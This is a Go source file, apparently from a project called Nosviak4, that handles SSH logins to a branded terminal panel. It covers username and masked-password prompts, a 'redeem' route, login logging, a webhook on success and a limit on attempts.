package masters

import (
	"Nosviak4/modules/gologr"
	"Nosviak4/source"
	"Nosviak4/source/database"
	"Nosviak4/source/functions/tui"
	"Nosviak4/source/masters/commands"
	"Nosviak4/source/masters/sessions"
	"Nosviak4/source/masters/terminal"
	"context"
	"errors"
	"strings"
	"time"
)

// Login handles every single login request
func Login(terminal *terminal.Terminal) error {
	timeout, close := context.WithDeadline(context.Background(), time.Now().Add(time.Duration(terminal.Config.LoginTimeout)*time.Second))
	defer func() {
		if close == nil || terminal.Channel == nil {
			return
		}

		close()
		terminal.Channel.Close()
	}()

	// CustomAuth disabled, sticks with the classic old SSH authentication screen.
	if !terminal.Config.CustomAuth {
		user, err := database.DB.GetUser(terminal.Conn.User())
		if err != nil {
			return errors.New("context breached")
		}

		session := sessions.NewSession(terminal, user)
		if err := database.DB.NewLogin(session.User, string(terminal.Conn.ClientVersion()), session.ConnIP()); err != nil {
			return err
		}

		return splashMiddleware(session)
	}

	t := tui.NewTerminal(terminal, timeout)

	for i := 0; i < terminal.Config.MaxAuthAttempts; i++ {
		err := terminal.ExecuteBranding(map[string]any{"term": t}, source.ASSETS, source.BRANDING, "login", "banner.tfx")
		if err != nil {
			return err
		}

		userPrompt, err := terminal.ExecuteBrandingToString(make(map[string]any), source.ASSETS, source.BRANDING, "login", "username.tfx")
		if err != nil {
			return err
		}

		username, err := terminal.NewReadWithContext(userPrompt, timeout).ChangeMaxLen(source.OPTIONS.Ints("maximum_user_length")).ChangeMinLen(source.OPTIONS.Ints("minimum_user_length")).ReadLine()
		if err != nil {
			return err
		}

		// navigate to the redeem page
		if strings.EqualFold(string(username), "redeem") {
			return redeem(terminal, timeout)
		}

		passPrompt, err := terminal.ExecuteBrandingToString(map[string]any{"username": string(username)}, source.ASSETS, source.BRANDING, "login", "password.tfx")
		if err != nil {
			return err
		}

		password, err := terminal.NewReadWithContext(passPrompt, timeout).Mask([]byte(source.OPTIONS.String("password_mask"))).ChangeMaxLen(source.OPTIONS.Ints("maximum_password_length")).ChangeMinLen(source.OPTIONS.Ints("minimum_password_length")).ReadLine()
		if err != nil {
			return err
		}

		/* indexes inside the database for the user */
		user, err := database.DB.GetUser(string(username))
		if err != nil || password == nil || user == nil {
			err := terminal.ExecuteBranding(map[string]any{"term": t}, source.ASSETS, source.BRANDING, "login", "bad-user.tfx")
			if err == nil {
				continue
			}

			terminal.Logger().WriteLog(gologr.ERROR, "branding error: %v", err)
			return nil
		}

		/* compares the passwords */
		if user.IsPassword(password) {
			session := sessions.NewSession(terminal, user)
			if err := database.DB.NewLogin(session.User, string(terminal.Conn.ClientVersion()), session.ConnIP()); err != nil {
				return err
			}

			commands.Conn.SendWebhook("login_success", map[string]any{"ip": session.ConnIP(), "user": user.User()})
			return splashMiddleware(session)
		}

		terminal.Logger().WriteLog(gologr.ERROR, "[SSH-CONN] %s entered an invalid password for %s", terminal.Conn.RemoteAddr().String(), user.Username)
		err = terminal.ExecuteBranding(map[string]any{"term": t}, source.ASSETS, source.BRANDING, "login", "invalid-password.tfx")
		if err != nil {
			terminal.Logger().WriteLog(gologr.ERROR, "branding error: %v", err)
		}
	}

	terminal.Logger().WriteLog(gologr.ERROR, "[SSH-CONN] reached the maximum amount of attempts (%s)", terminal.Conn.RemoteAddr().String())
	return terminal.ExecuteBranding(make(map[string]any), source.ASSETS, source.BRANDING, "login", "too_many_attempts.tfx")
}
